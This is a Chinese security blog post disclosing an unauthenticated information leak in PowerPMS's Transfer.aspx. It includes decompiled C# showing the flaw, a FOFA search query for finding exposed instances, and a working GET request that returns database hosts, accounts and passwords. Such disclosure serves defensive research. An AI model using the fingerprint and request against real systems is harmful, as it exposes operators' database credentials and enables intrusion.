---
title: "普华Powerpms Transfer.aspx 未授权访问致信息泄漏漏洞"
source: https://mrxn.net/jswz/powerpms-Transfer-LoadDataSource-data-leak.html
asset_dir: assets/普华powerpms-transfer.aspx-未授权访问致信息泄漏漏洞
---

# 普华Powerpms Transfer.aspx 未授权访问致信息泄漏漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/13 08:11
* 912浏览
* [0评论](#comment)
* 28分钟阅读

深入探索

SQL

鉴权

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

普华PowerPMS是上海普华科技发展股份有限公司旗下一款项目管理信息平台。其PowerPMS系统`Transfer.aspx`接口存在[信息泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)漏洞，攻击者可在无需认证的情况下，通过直接访问该文件，获取系统中存储的数据库配置信息，可能导致数据库数据泄露，进而引发未授权访问和系统控制风险。

网络安全

# 影响版本

# fofa语法

> app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power\_login\_btn"

# 漏洞分析

深入探索

漏洞扫描器

代码安全审计

Docker加速服务

看下Transfer.aspx的实现逻辑

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Transfer.aspx.cs" Inherits="Power.PMS.PowerPlat.Tools.Tools" %>
```

根据代码引用在`Power.PMS.dll`中找到`PowerPlat.Tools.Tools`的实现

```
public class Tools : Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    PowerGlobal.CheckSecurity(this.Request);
    string str1 = this.Request["ServerOperatorType"];
    if (str1 == null)
      throw new Exception("无法识别的操作方式");
    IEntityAction entityAction = (IEntityAction) new EntityAction();
    string str2 = str1;
    if (!string.op_Equality(str2, "LoadDataSource"))
    {
      if (!string.op_Equality(str2, "TransAllTables"))
      {
        if (!string.op_Equality(str2, "TransRecord"))
        {
          if (!string.op_Equality(str2, "CaseGUID"))
            return;
          string str3 = entityAction.CaseGUID(this.Request.QueryString["DataSource"], this.Request.QueryString["ObjDataSource"]);
          this.Response.Clear();
          this.Response.Write(str3);
          this.Response.End();
        }
        else
        {
          string str4 = entityAction.TransRecord("", this.Request.QueryString["DataSource"], this.Request.QueryString["ObjDataSource"]);
          this.Response.Clear();
          this.Response.Write(str4);
          this.Response.End();
        }
      }
      else
      {
        string str5 = entityAction.TransAllTables(this.Request.QueryString["DataSource"], this.Request.QueryString["ObjDataSource"]);
        this.Response.Clear();
        this.Response.Write(str5);
        this.Response.End();
      }
    }
    else
    {
      string str6 = JsonConvert.SerializeObject((object) entityAction.LoadDataSource());
      this.Response.Clear();
      this.Response.Write(str6);
      this.Response.End();
    }
  }
```

深入探索

安全工具开发

VPN服务

安全研究报告

根据`ServerOperatorType`参数的值进入不同的分支处理逻辑

漏洞预警服务

当**ServerOperatorType=LoadDataSource**时，会进入`LoadDataSource`方法

```
/// <summary>提取可用数据源</summary>
/// <returns></returns>
public List<DataBaseEntity> LoadDataSource()
{
  DAL.LoadDataSourceConfig(AppDomain.CurrentDomain.BaseDirectory);
  List<DataBaseEntity> dataBaseEntityList = new List<DataBaseEntity>();
  foreach (DataBaseEntity dataBaseEntity in DAL.ConnStrs.Values)
    dataBaseEntityList.Add(dataBaseEntity);
  return dataBaseEntityList;
}
```

其目的已经注释出来了，提取可用的数据源信息，然后以json格式响应在body

# 漏洞复现

```
GET /PowerPlat/Tools/Transfer.aspx?ServerOperatorType=LoadDataSource HTTP/1.1
Host: powerpms.mrxn.net
```

[![普华Powerpms Transfer.aspx 未授权访问致信息泄漏漏洞](images/img-001-69da17e33ef6.webp)](https://image.mrxn.net/bd814d48bc484dcb92828042efc09ecc.webp)

响应中包含当前可用的数据源信息，包括数据库地址、账户和密码等敏感信息。

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)
* [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[普华Powerpms Transfer.aspx 未授权访问致信息泄漏漏洞](https://mrxn.net/jswz/powerpms-Transfer-LoadDataSource-data-leak.html)  
文章链接：<https://mrxn.net/jswz/powerpms-Transfer-LoadDataSource-data-leak.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

网络安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/powerpms-Transfer-LoadDataSource-data-leak.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

安全研究工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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